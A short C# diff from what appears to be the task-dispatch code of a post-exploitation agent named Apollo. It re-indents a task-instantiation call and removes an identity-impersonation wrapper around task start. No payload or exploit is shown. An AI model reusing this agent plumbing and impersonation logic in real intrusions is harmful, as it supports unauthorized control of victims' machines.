@@ -69,8 +69,8 @@ namespace Apollo.Management.Tasks
                         else
                         {
                             Tasking t = (Tasking)Activator.CreateInstance(
-                                _loadedTaskTypes[result.Command],
-                                new object[] { _agent, result });
+                            _loadedTaskTypes[result.Command],
+                            new object[] { _agent, result });
                             var taskObj = t.CreateTasking();
                             // When the task finishes, we remove it from the queue.
                             taskObj.ContinueWith((_) =>
@@ -89,10 +89,8 @@ namespace Apollo.Management.Tasks
                                 OnTaskErrorOrCancel(t, taskObj);
                             }, System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
                             _runningTasks.TryAdd(t.ID(), t);
-                            using(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Impersonate())
-                            {
-                                taskObj.Start();
-                            }
+                            
+                            taskObj.Start();
 
                         }
 
